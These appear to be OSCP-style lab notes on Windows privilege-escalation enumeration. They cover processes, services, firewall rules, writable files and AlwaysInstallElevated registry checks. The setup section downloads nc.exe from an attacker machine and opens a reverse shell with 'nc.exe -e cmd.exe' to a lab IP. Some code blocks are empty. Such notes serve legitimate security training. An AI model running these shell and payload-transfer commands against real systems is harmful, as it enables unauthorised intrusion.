## Lab Setup

### Connect via RDP

```bash
xfreerdp /v:<TARGET_IP> /u:<USERNAME> /p:<PASSWORD> /cert:ignore /dynamic-resolution
```

```bash
xfreerdp /u:user /p:password321 /cert:ignore /v:10.112.139.20 /dynamic-resolution
```

### Transfer nc.exe to Windows

Locate nc.exe on Kali:

```bash
find /usr/share -iname "nc.exe" 2>/dev/null
```

Copy to working directory:

```bash
cp /usr/share/windows-resources/binaries/nc.exe .
```

Start HTTP server on Kali:

```bash
python3 -m http.server 8000
```

> You won't be able to serve on port 80 if the victim machine already has something running on it.

Download on Windows:

```cmd
powershell iwr http://192.168.131.128:8000/nc.exe -o nc.exe
```

### Get Reverse Shell

Start listener on Kali:

```bash
rlwrap -f . nc -lvnp 4444
```

Execute on Windows:

```cmd
nc.exe -e cmd.exe 192.168.131.128 4444
```

Result:

```
connect to [192.168.131.128] from (UNKNOWN) [10.114.181.157] 49992
Microsoft Windows [Version 10.0.17763.737]
C:\Users\user>
```

## 4. Process & Service Enumeration

### List all running processes

```cmd

```

### Verbose (shows which user runs each process)


### Map processes to services

```cmd
tasklist /svc
```

| Column | Meaning |
|--------|---------|
| `Image Name` | Process executable name |
| `PID` | Process ID |
| `Services` | Windows services hosted in that process |

Example from output:

```
svchost.exe    976    Browser, DsmSvc, gpsvc, Schedule, seclogon, Themes, wuauserv...
lsass.exe      608    KeyIso, SamSs
```

> **OSCP workflow**: Running processes → Identify services → Investigate service configuration → Look for misconfigurations.

### Check a specific process

```cmd
tasklist /fi "PID eq 1500"
```

### Query installed services

```cmd

```

> Look for services running under elevated privileges, unusual processes, or service binaries you can write to.

## 6. Firewall Enumeration

### Current firewall profile

```cmd
netsh advfirewall show currentprofile
```

```
Public Profile Settings:
----------------------------------------------------------------------
State                                 OFF
Firewall Policy                       BlockInbound,AllowOutbound
```

| Field | Meaning |
|-------|---------|
| `State ON/OFF` | Firewall enabled/disabled |
| `BlockInbound` | Incoming connections blocked by default |
| `AllowOutbound` | Outgoing connections allowed by default |

### Windows firewall profiles

| Profile | Typical use |
|---------|-------------|
| Domain | Connected to organization's domain |
| Private | Trusted home/private network |
| Public | Untrusted networks (public Wi-Fi) |

### Show all firewall rules

```cmd
netsh advfirewall firewall show rule name=all
```

| Field | Meaning |
|-------|---------|
| `Enabled` | Whether rule is active |
| `Direction` | Inbound (`In`) or outbound (`Out`) |
| `Protocol` | TCP, UDP, etc. |
| `LocalPort` | Port on the Windows machine |
| `Action` | Allow or Block |

### Filter rules by direction

```cmd
netsh advfirewall firewall show rule name=all dir=in
netsh advfirewall firewall show rule name=all dir=out
```

### Show all profiles

```cmd
netsh advfirewall show allprofiles
```

> Check firewall rules if port forwarding or reverse shells are not working.

## 9. Readable/Writable Files Enumeration

### Using accesschk.exe (Sysinternals)

```cmd
accesschk.exe -accepteula -uws "Everyone" "C:\Program Files" 2>nul
```

| Option | Meaning |
|--------|---------|
| `-u` | Suppress errors |
| `-w` | Show objects with write access |
| `-s` | Recurse through subdirectories |
| `-accepteula` | Auto-accept Sysinternals EULA (prevents GUI popup in reverse shells) |
| `2>nul` | Hide stderr |

```
RW C:\Program Files\Autorun Program\program.exe
RW C:\Program Files\File Permissions Service\filepermservice.exe
```

### Also check for `Users` group

```cmd
accesschk.exe -accepteula -uws "Users" "C:\Program Files" 2>nul
```

### PowerShell alternative

```powershell
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
```

## 12. AutoElevate Binaries (AlwaysInstallElevated)

### Check registry keys

```cmd
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
```

```
HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

```cmd
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
```

```
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
    DisableMSI    REG_DWORD    0x0
```

### What this means

| Registry value | Meaning |
|---------------|---------|
| `AlwaysInstallElevated = 0x1` | Enabled |
| `AlwaysInstallElevated = 0x0` | Disabled |
| `DisableMSI = 0x0` | Windows Installer is enabled |
| `DisableMSI = 0x1` | Only managed apps can be installed |
| `DisableMSI = 0x2` | Windows Installer completely disabled |

> [!WARNING]
> When `AlwaysInstallElevated = 1` in **BOTH** HKCU and HKLM, Windows Installer (`msiexec`) runs `.msi` packages with **elevated privileges**. A low-privileged user can craft a malicious `.msi` payload to gain `NT AUTHORITY\SYSTEM`.

```
AlwaysInstallElevated
HKCU = 1
HKLM = 1
→ Windows Installer elevated privileges enabled
→ Potential privilege escalation misconfiguration
```

> **OSCP memory trick**: `AlwaysInstallElevated = 1 + 1` → Both registry locations must be enabled for this to be exploitable. `DisableMSI = 0` is NOT what enables it.
